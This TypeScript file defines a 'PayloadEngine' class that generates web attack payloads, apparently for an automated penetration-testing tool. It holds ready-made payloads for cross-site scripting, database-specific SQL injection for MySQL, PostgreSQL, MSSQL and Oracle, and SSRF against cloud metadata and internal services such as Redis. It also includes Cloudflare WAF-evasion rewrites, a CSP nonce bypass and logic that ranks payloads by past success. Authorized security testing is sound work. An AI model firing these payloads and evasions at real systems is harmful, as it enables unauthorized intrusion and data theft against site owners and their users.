/**
 * PayloadEngine - Context-aware payload generation for STRIKE-level attacks
 *
 * This engine generates intelligent, adaptive payloads based on:
 * - Detected technology stack
 * - WAF/CSP signatures
 * - Previous failure patterns
 * - Target-specific context
 */

export interface DetectedProtections {
	waf: boolean
	csp: boolean
	rateLimiting: boolean
	wafVendorOrSignal?: string
	cspPolicySnippet?: string
}

export interface PayloadContext {
	technology: string
	wafSignature?: string
	cspPolicy?: string
	previousFailures: string[]
	targetEndpoint: string
	parameterName?: string
	injectionContext: "html" | "attribute" | "javascript" | "url" | "header" | "json" | "xml"
}

export interface GeneratedPayload {
	payload: string
	description: string
	evasionTechniques: string[]
	successProbability: number
	riskLevel: "low" | "medium" | "high"
}

export class PayloadEngine {
	private failurePatterns: Map<string, number> = new Map()
	private successPatterns: Map<string, number> = new Map()

	/**
	 * Generate context-aware XSS payloads
	 */
	generateXSSPayloads(context: PayloadContext): GeneratedPayload[] {
		const payloads: GeneratedPayload[] = []

		// Base payloads by injection context
		switch (context.injectionContext) {
			case "html":
				payloads.push(...this.generateHTMLXSSPayloads(context))
				break
			case "attribute":
				payloads.push(...this.generateAttributeXSSPayloads(context))
				break
			case "javascript":
				payloads.push(...this.generateJSXSSPayloads(context))
				break
			case "url":
				payloads.push(...this.generateURLXSSPayloads(context))
				break
		}

		// Apply WAF evasion if detected
		if (context.wafSignature) {
			return payloads.map((p) => this.applyWAFEvasion(p, context.wafSignature!))
		}

		// Apply CSP bypass if detected
		if (context.cspPolicy) {
			return payloads.map((p) => this.applyCSPBypass(p, context.cspPolicy!))
		}

		return this.rankPayloadsBySuccess(payloads, context)
	}

	/**
	 * Generate context-aware SQLi payloads
	 */
	generateSQLiPayloads(context: PayloadContext): GeneratedPayload[] {
		const payloads: GeneratedPayload[] = []

		// Technology-specific payloads
		switch (context.technology.toLowerCase()) {
			case "mysql":
				payloads.push(...this.generateMySQLPayloads(context))
				break
			case "postgresql":
				payloads.push(...this.generatePostgreSQLPayloads(context))
				break
			case "mssql":
				payloads.push(...this.generateMSSQLPayloads(context))
				break
			case "oracle":
				payloads.push(...this.generateOraclePayloads(context))
				break
			default:
				payloads.push(...this.generateGenericSQLPayloads(context))
		}

		return this.filterByPreviousFailures(payloads, context.previousFailures)
	}

	/**
	 * Generate SSRF payloads with internal service targeting
	 */
	generateSSRFPayloads(context: PayloadContext): GeneratedPayload[] {
		const payloads: GeneratedPayload[] = []

		// Cloud metadata services
		payloads.push({
			payload: "http://169.254.169.254/latest/meta-data/",
			description: "AWS EC2 metadata service",
			evasionTechniques: ["internal_ip"],
			successProbability: 0.7,
			riskLevel: "high",
		})

		// Internal services
		payloads.push({
			payload: "http://localhost:6379/info",
			description: "Redis service enumeration",
			evasionTechniques: ["localhost_bypass"],
			successProbability: 0.5,
			riskLevel: "medium",
		})

		// URL bypass techniques
		if (context.wafSignature) {
			payloads.push(...this.generateSSRFBypassPayloads(context))
		}

		return payloads
	}

	/**
	 * Learn from failed attempts to improve future payload generation
	 */
	recordFailure(payload: string, context: PayloadContext, errorMessage: string): void {
		const failureKey = `${context.injectionContext}:${payload.substring(0, 50)}`
		const currentCount = this.failurePatterns.get(failureKey) || 0
		this.failurePatterns.set(failureKey, currentCount + 1)

		// Learn from specific error patterns
		if (errorMessage.includes("blocked")) {
			this.recordWAFPattern(payload, context.wafSignature || "unknown")
		}
		if (errorMessage.includes("CSP")) {
			this.recordCSPPattern(payload, context.cspPolicy || "")
		}
	}

	/**
	 * Record successful payloads for future optimization
	 */
	recordSuccess(payload: string, context: PayloadContext): void {
		const successKey = `${context.injectionContext}:${payload.substring(0, 50)}`
		const currentCount = this.successPatterns.get(successKey) || 0
		this.successPatterns.set(successKey, currentCount + 1)
	}

	// HTML XSS payload generation
	private generateHTMLXSSPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "<script>alert(1)</script>",
				description: "Basic script injection",
				evasionTechniques: [],
				successProbability: 0.8,
				riskLevel: "low",
			},
			{
				payload: "<img src=x onerror=alert(1)>",
				description: "Event handler injection",
				evasionTechniques: ["event_handler"],
				successProbability: 0.7,
				riskLevel: "low",
			},
			{
				payload: "<svg onload=alert(1)>",
				description: "SVG-based injection",
				evasionTechniques: ["svg_element"],
				successProbability: 0.6,
				riskLevel: "medium",
			},
		]
	}

	// Attribute XSS payload generation
	private generateAttributeXSSPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: '" onmouseover="alert(1)',
				description: "Attribute breakout with event handler",
				evasionTechniques: ["attribute_breakout"],
				successProbability: 0.6,
				riskLevel: "medium",
			},
			{
				payload: "javascript:alert(1)",
				description: "JavaScript protocol injection",
				evasionTechniques: ["protocol_injection"],
				successProbability: 0.5,
				riskLevel: "medium",
			},
		]
	}

	// JavaScript context XSS payloads
	private generateJSXSSPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: ";alert(1)//",
				description: "JavaScript statement injection",
				evasionTechniques: ["statement_termination"],
				successProbability: 0.7,
				riskLevel: "high",
			},
			{
				payload: "'-alert(1)-'",
				description: "String escape injection",
				evasionTechniques: ["string_escape"],
				successProbability: 0.6,
				riskLevel: "high",
			},
		]
	}

	// URL context XSS payloads
	private generateURLXSSPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "javascript:alert(1)",
				description: "JavaScript URL scheme",
				evasionTechniques: ["url_scheme"],
				successProbability: 0.4,
				riskLevel: "medium",
			},
		]
	}

	// Database-specific SQL injection payloads
	private generateMySQLPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "' UNION SELECT 1,@@version,3-- ",
				description: "MySQL version disclosure",
				evasionTechniques: ["union_select"],
				successProbability: 0.7,
				riskLevel: "high",
			},
			{
				payload: "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- ",
				description: "MySQL boolean-based blind injection",
				evasionTechniques: ["boolean_blind"],
				successProbability: 0.6,
				riskLevel: "medium",
			},
		]
	}

	private generatePostgreSQLPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "' UNION SELECT NULL,version(),NULL-- ",
				description: "PostgreSQL version disclosure",
				evasionTechniques: ["union_select"],
				successProbability: 0.7,
				riskLevel: "high",
			},
		]
	}

	private generateMSSQLPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "' UNION SELECT NULL,@@version,NULL-- ",
				description: "MSSQL version disclosure",
				evasionTechniques: ["union_select"],
				successProbability: 0.7,
				riskLevel: "high",
			},
		]
	}

	private generateOraclePayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "' UNION SELECT NULL,banner,NULL FROM v$version-- ",
				description: "Oracle version disclosure",
				evasionTechniques: ["union_select"],
				successProbability: 0.7,
				riskLevel: "high",
			},
		]
	}

	private generateGenericSQLPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "' OR '1'='1",
				description: "Generic boolean bypass",
				evasionTechniques: ["boolean_logic"],
				successProbability: 0.8,
				riskLevel: "low",
			},
			{
				payload: "'; WAITFOR DELAY '00:00:05'-- ",
				description: "Time-based blind injection",
				evasionTechniques: ["time_delay"],
				successProbability: 0.6,
				riskLevel: "medium",
			},
		]
	}

	// SSRF bypass payload generation
	private generateSSRFBypassPayloads(context: PayloadContext): GeneratedPayload[] {
		return [
			{
				payload: "http://127.0.0.1:80/",
				description: "Localhost bypass variation",
				evasionTechniques: ["localhost_variation"],
				successProbability: 0.6,
				riskLevel: "medium",
			},
			{
				payload: "http://[::1]:80/",
				description: "IPv6 localhost bypass",
				evasionTechniques: ["ipv6_localhost"],
				successProbability: 0.5,
				riskLevel: "medium",
			},
		]
	}

	// WAF evasion techniques
	private applyWAFEvasion(payload: GeneratedPayload, wafSignature: string): GeneratedPayload {
		let evasivePayload = payload.payload

		if (wafSignature.toLowerCase().includes("cloudflare")) {
			// Cloudflare-specific evasions
			evasivePayload = evasivePayload
				.replace("alert", "prompt")
				.replace("<script>", "<ScRiPt>")
				.replace("onerror", "OnErRoR")
		}

		return {
			...payload,
			payload: evasivePayload,
			evasionTechniques: [...payload.evasionTechniques, "waf_evasion"],
			successProbability: payload.successProbability * 0.7, // Lower due to evasion complexity
		}
	}

	// CSP bypass techniques
	private applyCSPBypass(payload: GeneratedPayload, cspPolicy: string): GeneratedPayload {
		let bypassPayload = payload.payload

		if (cspPolicy.includes("'unsafe-inline'")) {
			// Inline scripts allowed
			return payload
		}

		if (cspPolicy.includes("nonce-")) {
			// Try to extract and use nonce
			bypassPayload = `<script nonce="EXTRACT_FROM_PAGE">${payload.payload}</script>`
		}

		return {
			...payload,
			payload: bypassPayload,
			evasionTechniques: [...payload.evasionTechniques, "csp_bypass"],
			successProbability: payload.successProbability * 0.5, // Much lower due to CSP restrictions
		}
	}

	// Ranking and filtering methods
	private rankPayloadsBySuccess(payloads: GeneratedPayload[], context: PayloadContext): GeneratedPayload[] {
		return payloads.sort((a, b) => {
			// Factor in previous success patterns
			const aSuccessKey = `${context.injectionContext}:${a.payload.substring(0, 50)}`
			const bSuccessKey = `${context.injectionContext}:${b.payload.substring(0, 50)}`

			const aSuccessCount = this.successPatterns.get(aSuccessKey) || 0
			const bSuccessCount = this.successPatterns.get(bSuccessKey) || 0

			const aScore = a.successProbability + aSuccessCount * 0.1
			const bScore = b.successProbability + bSuccessCount * 0.1

			return bScore - aScore
		})
	}

	private filterByPreviousFailures(payloads: GeneratedPayload[], previousFailures: string[]): GeneratedPayload[] {
		return payloads.filter((payload) => {
			return !previousFailures.some(
				(failure) => payload.payload.includes(failure) || failure.includes(payload.payload.substring(0, 20)),
			)
		})
	}

	private recordWAFPattern(payload: string, wafSignature: string): void {
		// Record patterns that trigger WAF blocks
		console.log(`WAF ${wafSignature} blocked: ${payload.substring(0, 50)}`)
	}

	private recordCSPPattern(payload: string, cspPolicy: string): void {
		// Record patterns that violate CSP
		console.log(`CSP violation: ${payload.substring(0, 50)}`)
	}
}
